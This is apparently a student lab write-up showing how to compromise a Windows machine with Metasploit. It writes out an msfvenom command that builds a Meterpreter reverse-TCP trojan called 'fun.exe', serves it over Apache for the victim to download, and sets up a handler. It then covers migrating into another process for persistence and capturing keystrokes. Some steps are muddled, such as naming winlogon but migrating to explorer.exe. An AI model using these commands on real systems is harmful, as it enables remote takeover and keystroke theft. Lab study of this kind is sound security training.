# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## Find the attackers ip address using ifconfig
## OUTPUT :
![Screenshot 2025-05-15 235928](https://github.com/user-attachments/assets/b3d7920e-c4e2-4946-a859-7b89a4d3b26c)

## Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT :
![Screenshot 2025-05-16 000004](https://github.com/user-attachments/assets/2a20ddfe-bc02-4f02-ab60-678797a11874)
copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start

## Check the status of apache2
## OUTPUT :
![Screenshot 2025-05-16 000035](https://github.com/user-attachments/assets/3ba3c81c-adc2-459a-95e0-f7201e42f61d)
## Invoke msfconsole:
## OUTPUT:
![Screenshot 2025-05-16 000107](https://github.com/user-attachments/assets/21a6f643-9de2-4f8e-9746-1c3e4d427e3b)
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT :
![Screenshot 2025-05-16 000139](https://github.com/user-attachments/assets/9952b9be-7303-4ac6-b21f-3fb17ebbd8cb)
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## OUTPUT :
![Screenshot 2025-05-16 000215](https://github.com/user-attachments/assets/a5f0b4e3-4f27-4eb3-80f9-2759800d671c)
## WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads

## BROWSE OUTPUT :
![Screenshot 2025-05-15 233023](https://github.com/user-attachments/assets/8b8d9424-7546-43b8-a5d3-792bc433f802)

## DOWNLOAD OUTPUT :
![Screenshot 2025-05-15 233044](https://github.com/user-attachments/assets/960dda11-c90e-4c9b-b444-78912826fe3c)

## COME BACK TO PARROT :
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

## OUTPUT :
![Screenshot 2025-05-16 000248](https://github.com/user-attachments/assets/a1e582f0-9024-49a6-bec2-23c9da3d4a50)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

## OUTPUT :
![Screenshot 2025-05-16 000315](https://github.com/user-attachments/assets/293fe68a-5dd5-4402-91ad-6060ee02b53a)
## WINDOWS OUTPUT :
![Screenshot 2025-05-15 234517](https://github.com/user-attachments/assets/3c5dbcfa-f78a-4365-993c-95f767b4dc1b)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT :
![Screenshot 2025-05-16 000346](https://github.com/user-attachments/assets/7fdfe3bd-88f9-49e8-a314-cabc990d0ae9)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
